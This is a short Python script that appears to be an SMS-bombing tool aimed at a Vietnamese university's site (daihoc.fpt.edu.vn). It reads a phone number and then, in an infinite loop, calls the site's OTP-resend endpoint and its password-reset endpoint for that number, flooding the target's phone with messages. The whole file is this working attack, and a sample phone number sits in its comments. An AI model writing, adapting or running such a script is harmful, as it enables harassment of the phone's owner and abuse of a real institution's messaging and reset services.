#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests

def verify(phone): #phone = 0943687522
	link = "https://daihoc.fpt.edu.vn/user/login/gui-lai-otp.php?resend_opt=1&mobile={0}".format(phone)
	data = requests.get(link)
	return(data)


def forgotpw(phone): #phone = 0943687522
	link = "https://daihoc.fpt.edu.vn/user/login/lay-lai-mat-khau.php"
	data = {
		"txt_mobile": "",
		"forgot_pw": 1
		}
	data["txt_mobile"] = phone
	res = requests.post(link,data=data)
	return(res)


phone = input(">_ Phone : ")
count = 0
while True:
	count = count + 1
	print(count,verify(phone))
	count = count + 1
	print(count,forgotpw(phone))

